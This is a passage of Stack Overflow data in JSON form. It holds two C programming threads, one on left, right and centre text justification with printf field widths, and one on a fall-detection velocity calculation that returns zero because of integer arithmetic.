5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444870041, "post_id": 33134379, "comment_id": 54087344, "body": "<code>for(i = 0; I &lt; strlen(string);</code> This won&#39;t work. <code>string</code> is <code>char **</code>. I&#39;ll add a long explanation that I think will help."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "edited": false, "score": 0, "creation_date": 1444874929, "post_id": 33134379, "comment_id": 54088453, "body": "@AdamAlred what I want to make sure doesn&#39;t get lost in the fray is the fact that there are probably 2 or more ways to approach any part of the code. For instance in <code>inputfile</code> where i use <code>strdup</code> to allocate and copy the current line to a new block of memory and assign it to the address to <code>(*t)[idx]</code> instead of using 2 lines <code>malloc</code> and then <code>strncpy</code>, doesn&#39;t mean the <code>malloc&#47;strncpy</code> approach is incorrect. Quite the opposite, both are 100% correct ways to accomplish the task. So don&#39;t think you are not free to do it the way you like (as long as it is also 100%) correct <code>:)</code>"}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 1, "last_activity_date": 1444873618, "last_edit_date": 1444873618, "creation_date": 1444852282, "answer_id": 33134379, "question_id": 33131934, "link": "https://stackoverflow.com/questions/33131934/formatting-a-file-of-text-based-on-input/33134379#33134379", "title": "Formatting a file of text based on input", "body": "<p>Following on from the comment, your task of justifying the lines is more a logic challenge for structuring your output function than it is a difficult one. You are getting close. There are a number of ways to do it, and you probably need to add error checking to make sure <code>width</code> isn't less than the longest line.</p>\n\n<p>Here is a quick example you can draw from. Make sure you understand why each line was written the way it was, and pay close attention to the variable length array definition (you will need to compile as c99 - or if using gcc, rely on the gcc extension (default)). Let me know if you have questions:</p>\n\n<pre><code>/*  format 'n' lines of output of 't' justified as specified in 'just'\n    (left 'l', right 'r' or centered 'c') within a width 'w'. \n    NOTE: 'w' must be larger than the longest line in 't'.\n*/\nvoid formatted (char **t, char just, size_t w, size_t n)\n{\n    if (!t || !*t) return;\n    size_t i = 0;\n    size_t lmax = 0;\n    size_t len[n];\n\n    /* calculate the length of each line, set lmax */\n    for (i = 0; i &lt; n; i++) {\n        len[i] = strlen (t[i]);\n        if (len[i] &gt; lmax) lmax = len[i];\n    }\n\n    /* handle w &lt; lmax reformat or error here */\n    if (w &lt; lmax) {\n        fprintf (stderr, \"%s() error: invalid width &lt; lmax (%zu).\\n\",\n                 __func__, lmax);\n        return;\n    }\n\n    /* left justified output */\n    if (just == 'l') {\n        for (i = 0; i &lt; n; i++) {\n            printf (\"%s\\n\", t[i]);\n        }\n        return;\n    }\n\n    /* center or right justified output */\n    for (i = 0; i &lt; n; i++) {\n        int spaces = w - len[i];\n        if (just == 'c')\n            printf (\"%*s%s\\n\", spaces/2, \" \", t[i]);\n        else if (just == 'r')\n            printf (\"%*s%s\\n\", spaces, \" \", t[i]);\n    }\n}\n</code></pre>\n\n<p><strong>Note:</strong> if you are on windows, change <code>__func__</code> to the function name in each of the error statements.</p>\n\n<p><strong>Logic of Function - Long Version</strong></p>\n\n<p>Let's look a little closer at what the function is doing and why it does it the way it does. First, lets look at the paramaters it takes:</p>\n\n<pre><code>void formatted (char **t, char just, size_t w, size_t n)\n</code></pre>\n\n<p><code>char **t</code>, your <em>'string'</em>, well... actually your <em>array or pointers to type</em> <code>char*</code>. When you pass the array of pointers to your function, and this may be where your confusion is, you only have 2 ways to iterate over the array an print each of the lines of text: <strong>(1)</strong> pass the number of valid pointers that point to strings containing text, or <strong>(2)</strong> provide a <em>sentinel</em> within the array that is pointed to by the pointer following the last pointer that points to a valid line of text. (usually just <code>NULL</code>) The sentinel serves as the pointer in the array that tells you (<em>\"Hey dummy, stop trying to print lines -- you already printed the last one...\"</em>)</p>\n\n<p>This takes a little more explanation. Consider your array of pointers in memory. Normally you will always allocate some reasonably anticipated number of pointers to fill, and when you fill the last pointer, you will <code>realloc</code> the array to contain more space. What this means is you will always have at least 1 pointer at the end of your array that is not filled. If you will intialize your array to contain <code>NULL</code> pointers at the very beginning (by allocating with <code>calloc</code> instead of <code>malloc</code>) -- you automatically provide a sentinel, or, you can always explicitly set the next pointer to <code>NULL</code> as you fill your array. This will leave your array of pointers to char* looking similar to the following:</p>\n\n<pre><code>  Pointer         The pointers in the array of pointers to char*, char **t;\n  Address         point to the first character in each associated string.\n+-----------+\n| 0x192a460 | --&gt; The quick brown\n+-----------+\n| 0x192a480 | --&gt; fox jumps over\n+-----------+\n| 0x192a4a0 | --&gt; a lazy\n+-----------+\n| 0x192a4c0 | --&gt; dog.\n+-----------+\n|   NULL    |\n+-----------+\n|   NULL    |\n+-----------+\n    ...\n</code></pre>\n\n<p><strong>Understand:</strong> your <code>string</code>, my <code>t</code> is an <code>array of pointers to type char*</code> not the strings themselves. Your <code>string</code> is the left column of <strong>pointers</strong> above. <code>string</code> is an array of the starting addresses of each real string and your <code>string[i]</code> will be the start of actual string itself -- at that address. <code>i</code> will range from <code>0-3</code> (<code>4</code> total) where <code>string[0] = \"The quick brown\"</code>, <code>string[1] = \"fox jumps over\"</code>, etc.. To help, change the name in your code of <code>string</code> to <code>array</code> or <code>str_array</code> to help keep this straight.</p>\n\n<p>Your 2 options for iterating over the array to print each string become <strong>(1)</strong> (with size 'n' passed to function):</p>\n\n<pre><code>for (i = 0; i &lt; n; i++)\n    printf (\"%s\\n\", t[i]);\n</code></pre>\n\n<p>or <strong>(2)</strong> (relying on a sentinel):</p>\n\n<pre><code>while (t[i]))\n    printf (\"%s\\n\", t[i++]);\n</code></pre>\n\n<p>(while not readily apparent here, this provides significant benefits as your code becomes more complex and you need to pass the array between many different functions)</p>\n\n<p>Now that you know how you can access each of your strings, start with the case where you will just print the string left justified. You don't care about the length and you don't care about the width (<em>as long as your string will fit within the</em> <code>width</code>). All you need to do is print each of the strings. Since we pass the number of strings <code>'n'</code> to the funciton, we can simply use the <code>for</code> loop (method 1) to print each string. (the length is computed prior to printing to insure each string will fit in <code>width</code>, since we will use it later, we store each length in the variable length array <code>len</code> so we don't have to make redudant calls to <code>strlen</code> later)</p>\n\n<p>The more interesting cases are the <code>center</code> and <code>right</code> justified cases. In addition to 'n' you need to know which justification the user wants. You can pass any type flag you want to pass that information to the function. A <code>char</code> (<code>1-byte</code>) is simply the most efficient and does not require conversion to a number when read as input to the program. That is essentially why I chose to pass <code>just</code> as a <code>char</code> instead of an <code>int</code> (<code>4-bytes</code> + conversion on input) (or <code>short</code> (<code>2-bytes</code>), etc..)</p>\n\n<p>Let's first look at how we right-justify the output. For discussion, let's consider an output width of <code>20</code> characters you want to right-justify your strings in. Your first string is <code>15</code> (printable) characters long (it's actually <code>16</code> chars in memory due to the <code>null-terminating</code> char at the end). Let's visualize what our string of printable characters would look like in a 20-character buffer (which you would use to save a right-justified copy of the string in memory, rather than printing)</p>\n\n<pre><code>|&lt;-------  20 character width  --------&gt;|\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| | | | | |T|h|e| |q|u|i|c|k| |b|r|o|w|n|\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n          |&lt;--  15 character length  --&gt;|\n</code></pre>\n\n<p>This makes it easy to see how many spaces are needed before we start printing our string. The task here is to turn this into a generalized piece of code to handle any length string. Not too difficult:</p>\n\n<pre><code>spaces = width - length;\n</code></pre>\n\n<p>Then to utilize this to print the string right-justified, we make use of the <code>minimum field width</code> directive in the <code>printf</code> format string. Of particular use here, is the ability to specify the field width directive as a variable in the <code>printf</code> argument list. Constructing the format string and argument list to accomplish our goal, we have:</p>\n\n<pre><code>printf (\"%*s%s\\n\", spaces, \" \", t[i]);\n</code></pre>\n\n<p>Which says, print a minimum field width of <code>spaces</code> for the string <code>\" \"</code> (which essentially prints <code>spaces</code> number of spaces -- poor choice of names) followed by the actual string in our array of pointers <code>t[i]</code>.</p>\n\n<p>Looking at the diagram again, what would we have to do to shift the string to the center of the 20-character width? Instead of shifing the whole <code>width - length</code> number of spaces, we could only shift it <code>1/2</code> that much and it would end up where we want it. (I can hear the gears in your head grinding, and I can smell the smoke -- \"but, wait... <code>5</code> is an odd number and we are using integers!\" -- it doesn't matter, integer division will take care of it, and if we shift by 2 instead of 2.5, it's just fine, you can't print 1/2 a character... So putting it all together, to handle centered or right justified text, all you need is:</p>\n\n<pre><code>for (i = 0; i &lt; n; i++) {\n    int spaces = w - len[i];\n    if (just == 'c')\n        printf (\"%*s%s\\n\", spaces/2, \" \", t[i]);\n    else if (just == 'r')\n        printf (\"%*s%s\\n\", spaces, \" \", t[i]);\n}\n</code></pre>\n\n<p><strong>Putting It All Together With The Rest</strong></p>\n\n<p>Sometimes seeing how the whole thing fits together helps. Same rules. Go though it function-by-function, line-by-line, and ask questions when you get struck. C is a low-level language, meaning you have to understand where things are in memory. When it comes down to it, programming is really about how to manipulate what you load into memory. Other languages try to hide that from you. C doesn't. That's its strength, and also where you have to concentrate a good part of your learning. Enough babble, here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define MAXC 256\n#define MAXL 64\n\nchar **inputfile (char ***t, FILE *fp, size_t *sz);\nvoid formatted (char **t, char just, size_t w, size_t n);\nvoid *xcalloc (size_t n, size_t s);\nvoid freecdp (char **p, size_t n);\nunsigned chr2lower (unsigned c);\n\nint main (int argc, char **argv) {\n\n    if (argc &lt; 4) {  /* validate required arguments on command line */\n        fprintf (stderr, \"error: insufficient input.  \"\n                        \"usage: %s just width [filename (stdin)]\\n\",\n                        argv[0]);\n        return 1;\n    }\n\n    char **text = NULL;    /* initialize all variables for main   */\n    size_t lines = 0;\n    char j = 0;            /* the following are ternary operators */\n    char just = argc &gt; 1 ? *argv[1] : 'l'; /* sets defaults if no input */\n    size_t width = argc &gt; 2 ? (size_t)strtol (argv[2], NULL, 10) : 0;\n    FILE *fp = argc &gt; 3 ? fopen (argv[3], \"r\") : stdin;\n\n    /* read input from file */\n    if (!(inputfile (&amp;text, fp, &amp;lines))) { /* check if return is NULL */\n        fprintf (stderr, \"error: file read failed '%s'.\\n\", \n                argc &gt; 3 ? argv[3] : \"stdin\");\n        return 1;\n    }\n\n    j = chr2lower (just);  /* force user input to lower-case */\n    if (j != 'l' &amp;&amp; j != 'r' &amp;&amp; j != 'c')\n        fprintf (stderr, \"error: invalid justification '%c' \"\n                        \"(defaulting to 'left').\\n\", just);\n\n    /* print output in requested justification */\n    formatted (text, j, width, lines);\n\n    /* free all memory allocated in program */\n    freecdp (text, lines);\n\n    return 0;\n}\n\nchar **inputfile (char ***t, FILE *fp, size_t *sz)\n{\n    if (!t || !sz) {  /* validate parameters are not NULL */\n        fprintf (stderr, \"%s() error: invalid parameters.\\n\", __func__);\n        return NULL;\n    }\n\n    if (!fp) {        /* check that file pointer is valid */\n        fprintf (stderr, \"%s() error: file open failed.\\n\", __func__);\n        return NULL;\n    }\n\n    size_t idx = 0;       /* declare/initialize function variables */\n    size_t maxl = MAXL;\n    char ln[MAXC] = {0};\n\n    /* allocate MAXL number of pointers */\n    *t = xcalloc (MAXL, sizeof **t);\n\n    while (fgets (ln, MAXC, fp)) {   /* read each line in file */\n\n        size_t len = strlen (ln);    /* calculate length */\n\n        /* remove trailing newline (or carriage return) */\n        while (len &amp;&amp; (ln[len-1] == '\\n' || ln[len-1] == '\\r'))\n            ln[--len] = 0;\n\n        /* allocate &amp; copy ln saving pointer in t[i], increment i by 1 */\n        (*t)[idx++] = strdup (ln);     /* strdup allocates &amp; copies    */\n\n        if (idx == maxl) {  /* check if you reached limit, realloc if needed */\n            void *tmp = realloc (*t, maxl * sizeof **t * 2);\n            if (!tmp) {\n                fprintf (stderr, \"%s() virtual memory exhausted.\\n\", __func__);\n                return NULL;\n\n            }\n            *t = tmp;  /* set new pointers NULL below (sentinel) */\n            memset (*t + maxl, 0, maxl * sizeof **t);\n            maxl *= 2;\n        }\n    }\n    *sz = idx;  /* update value at address of sz so it is available in main */\n\n    if (fp != stdin) fclose (fp);\n\n    return *t;\n}\n\n/*  format 'n' lines of output of 't' justified as specified in 'just'\n    (left 'l', right 'r' or centered 'c') within a width 'w'. \n    NOTE: 'w' must be larger than the longest line in 't'.\n*/\nvoid formatted (char **t, char just, size_t w, size_t n)\n{\n    if (!t || !*t) return;\n    size_t i = 0;\n    size_t lmax = 0;\n    size_t len[n];\n\n    /* calculate the length of each line, set lmax */\n    for (i = 0; i &lt; n; i++) {\n        len[i] = strlen (t[i]);\n        if (len[i] &gt; lmax) lmax = len[i];\n    }\n\n    /* handle w &lt; lmax reformat or error here */\n    if (w &lt; lmax) {\n        fprintf (stderr, \"%s() error: invalid width &lt; lmax (%zu).\\n\", \n                __func__, lmax);\n        return;\n    }\n\n    /* left justified output */\n    if (just == 'l') {\n        for (i = 0; i &lt; n; i++) {\n            printf (\"%s\\n\", t[i]);\n        }\n        return;\n    }\n\n    /* center or right justified output */\n    for (i = 0; i &lt; n; i++) {\n        int spaces = w - len[i];\n        if (just == 'c')\n            printf (\"%*s%s\\n\", spaces/2, \" \", t[i]);\n        else if (just == 'r')\n            printf (\"%*s%s\\n\", spaces, \" \", t[i]);\n    }\n}\n\n/* help functions below for calloc, free, and to lower-case */\nvoid *xcalloc (size_t n, size_t s)\n{\n    register void *memptr = calloc (n, s);\n    if (memptr == 0) {\n        fprintf (stderr, \"%s() error: virtual memory exhausted.\\n\",\n                __func__);\n        exit (EXIT_FAILURE);\n    }\n\n    return memptr;\n}\n\nvoid freecdp (char **p, size_t n)\n{\n    if (!p) return;\n    size_t i;\n\n    for (i = 0; i &lt; n; i++)\n        free (p[i]);\n    free (p);\n}\n\nunsigned chr2lower (unsigned c)\n{   return ('A' &lt;= c &amp;&amp; c &lt;= 'Z') ? c | 32 : c; }\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/str_justify l 15 dat/fox_4lines.txt\nThe quick brown\nfox jumps over\na lazy\ndog.\n\n$ ./bin/str_justify c 15 dat/fox_4lines.txt\n The quick brown\n fox jumps over\n    a lazy\n     dog.\n\n$ ./bin/str_justify r 15 dat/fox_4lines.txt\n The quick brown\n fox jumps over\n         a lazy\n           dog.\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5446240, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153630496039144/picture?type=large", "display_name": "Adam Alred", "link": "https://stackoverflow.com/users/5446240/adam-alred"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 586, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1444879797, "creation_date": 1444843872, "last_edit_date": 1444846368, "question_id": 33131934, "link": "https://stackoverflow.com/questions/33131934/formatting-a-file-of-text-based-on-input", "title": "Formatting a file of text based on input", "body": "<p>I am working on a project for school and I have run into a little bit of trouble. The gist of the project is to write a program that reads in a file of text and formats that file so that it fits in a specific width.To format this file, the user specifies the input file, the length of an output line, and the justification for the output text. An example would be this:</p>\n\n<pre>\n$ ./format test.dat 15 right\nThe quick brown\n fox jumps over\n   the lazy old\n           dog.\n$ ./format test.dat 15 left\nThe quick brown\nfox jumps over\nthe lazy old\ndog.\n$ ./format test.dat 15 center\nThe quick brown\nfox jumps over\n the lazy old\n     dog.\n</pre>\n\n<p>Anyway, I am basically stuck on how to go about outputting the file based on this. Attached below is my code for reading in the file, and what little I have done on outputting the file. I am mainly looking for tips or suggestions on how to go about doing it. I know I need to use printf with a width and such, but I am confused on how to move to the next line.</p>\n\n<pre><code>char **inputFile(FILE *fp, int size) {\n    int i = 0;\n    char *token;\n    char **str;\n    str = malloc(sizeof(char *) * size);\n    token = readToken(fp);\n    while(!feof(fp)) {\n        if(i+1 == size) {\n            realloc(str, size * 2);\n        }\n\n        str[i] = token;\n        token = readToken(fp);\n        i++;\n    }\n    return str;\n}\n\nvoid toPrint(char **string, int width, int indent) {\n    int i;\n    int curLineLength;\n    if(indent == 0) {\n       for(i = 0; I &lt; strlen(string); i++\n            char *token = string[i];\n            if(curLineLength + strlen(*string) &gt; width) {\n                if(curLineLength &gt; 0) {\n                    printf(\"\\n\");\n                    curLineLength = 0;\n                }\n            }\n            printf(\"%s \", token);\n            curLineLength += strlen(*string);\n    }\n    /*\n    if(indent == 1) {\n\n    }\n    if(indent == 2) {\n\n    }\n    */\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 568, "user_id": 4157408, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a44b6a712c8ad167e7331cef927d46a2?s=128&d=identicon&r=PG&f=1", "display_name": "void_ptr", "link": "https://stackoverflow.com/users/4157408/void-ptr"}, "edited": false, "score": 9, "creation_date": 1444843296, "post_id": 33131763, "comment_id": 54075025, "body": "<code>int numVelocity</code> - change to <code>double numVelocity</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1444843568, "post_id": 33131763, "comment_id": 54075178, "body": "<code>#define TRUE 1 ...</code> <b>Don&#39;t!</b> Use proper boolean types and the values. See <code>stdbool.h</code>!"}, {"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444843747, "post_id": 33131763, "comment_id": 54075274, "body": "My skeleton code from my professor included the  <code>#define TRUE 1</code> so I have to leave it for now."}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444848410, "post_id": 33133201, "comment_id": 54077998, "body": "I have <code>v</code> initialized as a double."}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 1, "creation_date": 1444848531, "post_id": 33133201, "comment_id": 54078069, "body": "Yes that defines the type but it currently has no value :D!  saying double v; doesn&#39;t give v a value. What happens now if you try to add 1 to it? We don&#39;t know because we don&#39;t know what we&#39;re adding 1 to. It could be anything.  You need to write double v=0; to start with (or whatever your initial velocity is) then we can add 1 to it (for instance) because we now know what we&#39;re adding 1 to"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444848657, "post_id": 33133201, "comment_id": 54078152, "body": "No problem, you can get your compiler to tell you useful things like this.  If you&#39;re using GCC for instance, adding -Wall to the compilation command will let you know about various type issues, unused variables, use of uninitialised variables etc :)"}, {"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444848742, "post_id": 33133201, "comment_id": 54078205, "body": "Oh that is great to know because I use gcc. Also, how would I go about calculating the <code>percent</code> that is commented out?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444848833, "post_id": 33133201, "comment_id": 54078257, "body": "Percent difference between the distances?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444848967, "post_id": 33133201, "comment_id": 54078338, "body": "If so, you&#39;ll need to store the previous distance in a variable too so you have both. (And you&#39;ll also need to define a double percent; variable).  So you can do something like oldDistance = distance; distance = metersFallen(secFall); percent = 100.0 * (distance - oldDistance)/oldDistance"}, {"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444849721, "post_id": 33133201, "comment_id": 54078774, "body": "Ok I will try that. Also, for my <code>p</code> I am getting an output of <code>-0.115393 meters</code> which doesn&#39;t seem right."}, {"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444850138, "post_id": 33133201, "comment_id": 54079019, "body": "Also for the percent instead of using <code>oldDistance</code> wouldn&#39;t I just use <code>distance</code> for the old one and <code>p</code> as the new one?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444851511, "post_id": 33133201, "comment_id": 54079803, "body": "Hmm no that doesn&#39;t seem right. Try the same tricks again and make sure your times are actually doubles and type the numerical constants with a decimal point. If that doesn&#39;t work, you&#39;ll have to try and stick some print statements in your functions to print out what the values are, and then compare them with what you think they should be from your input file. That will narrow down where it&#39;s going wrong :).   As for the percent, sure it depends what you&#39;re calculating the percentage of. You know what your variables are better than us :)."}, {"owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444851618, "post_id": 33133201, "comment_id": 54079861, "body": "So you are saying <code>int time = 0;</code> should be <code>double time = 0.0;</code>?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "reply_to_user": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "edited": false, "score": 0, "creation_date": 1444851816, "post_id": 33133201, "comment_id": 54079971, "body": "That&#39;s one way of doing it, but that would require a few rewrites to your scanf functions. The easy way is to just pass <code>(x, v, (double)time, seconds);</code> to your function instead of <code>(x, v, time, seconds);</code>"}], "tags": [], "owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "is_accepted": false, "score": 2, "last_activity_date": 1444848241, "creation_date": 1444848241, "answer_id": 33133201, "question_id": 33131763, "link": "https://stackoverflow.com/questions/33131763/why-is-velocity-returning-zero-in-c/33133201#33133201", "title": "Why is velocity returning zero? In C", "body": "<p>Your velocity function is almost certainly returning 0 because you have defined <code>numVelocity</code> as an <code>int</code>.</p>\n\n<p>In C, when doing computations on integers, the answer will always be rounded down to the nearest integer and as your time steps are on the order of 5, your second term is going to be close to 0. Adding this to something close to 0 will round down to 0.</p>\n\n<p>You also haven't initialised <code>v</code> as far as I can tell and you are passing <code>v</code> (unitialised) into your velocity function to compute <code>v</code> which will give you undefined results (most likely 0...).</p>\n\n<p>Also, when doing calculations in double precision, you should write constants with a decimal point of 0 I.e. <code>1000.0</code>. That is interpreted as a double by the program rather than <code>1000</code> which is an int.</p>\n\n<p>Likewise, time is an integer variable and you have requested that it is a double in your function. You can cast it to do this by passing <code>(double)time</code> instead of <code>time</code>.</p>\n\n<p>Try changing these things in your code (initialise v by setting it to your initial velocity) and see what changes :)</p>\n"}], "owner": {"reputation": 15, "user_id": 3238725, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b57b8b355bc996bf5867dd96c9c7d3da?s=128&d=identicon&r=PG&f=1", "display_name": "MikeG", "link": "https://stackoverflow.com/users/3238725/mikeg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1444848241, "creation_date": 1444843225, "question_id": 33131763, "link": "https://stackoverflow.com/questions/33131763/why-is-velocity-returning-zero-in-c", "title": "Why is velocity returning zero? In C", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n#define TRUE 1\n#define FALSE 0\n#define GRAVITY 9.8\n\ndouble mag(double x, double y, double z);\ndouble metersFallen(double fallTime);\ndouble velocity (double v, double t1, double t2, double magAcc);\ndouble position (double x, double v, double t1, double t2);\n\nint main()\n{\n    printf(\"Ok, I'm now receiving data.\\n\");\n\n    int running = TRUE;\n    double secFall = 0;;\n    double distance = 0;\n    int counter = 0;\n    int programStartTime = 0;\n    double currentTime = 0;\n    int time = 0;\n    int start = 0, end = 0;\n    double x, y, z, v, p;\n    double seconds;\n\n    scanf(\"%d,%lf,%lf,%lf\", &amp;time, &amp;x, &amp;y, &amp;z);\n    printf(\"I'm Waiting\");\n    programStartTime = time;\n    seconds = time;\n\n    while(running){\n\n        scanf(\"%d,%lf,%lf,%lf\", &amp;time, &amp;x, &amp;y, &amp;z);\n\n        if((time - programStartTime) &gt;= 1000){\n\n            printf(\".\");\n            programStartTime = time;\n\n        }   \n\n        if(mag(x, y, z) &lt; .75 ){\n\n            start = time;\n            printf(\"Help me! I'm falling\");\n\n            while(end == 0){\n\n                if((time - programStartTime) &gt;= 1000){\n\n                    printf(\"!\");\n                    programStartTime = time;\n                }\n\n                scanf(\"%d,%lf,%lf,%lf\", &amp;time, &amp;x, &amp;y, &amp;z);\n\n                v = velocity(v, time, seconds, mag(x,y,z));\n                p = position(x, v, time, seconds);\n                seconds = time;\n\n                if(mag(x, y, z) &gt; .95 ){\n\n                    end = time;\n                    running = FALSE;\n                }\n                fflush(stdout);\n            }\n        }\n        